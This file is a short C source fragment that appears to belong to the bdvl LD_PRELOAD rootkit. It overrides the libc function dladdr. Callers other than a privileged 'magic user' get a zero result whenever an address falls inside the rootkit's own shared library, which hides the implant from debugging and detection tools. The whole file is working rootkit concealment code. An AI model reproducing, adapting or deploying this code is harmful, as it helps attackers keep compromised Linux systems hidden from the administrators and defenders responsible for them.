#include "../../util/util.h"

int dladdr(const void *addr, Dl_info *info){
    hook(CDLADDR);
    if(magicusr()) return (long)call(CDLADDR, addr, info);

    Dl_info bdvl_info;
    if((long)call(CDLADDR, addr, &bdvl_info) != 0 &&
        strstr(BDVLSO, bdvl_info.dli_fname))
        return 0;

    return (long)call(CDLADDR, addr, info);
}
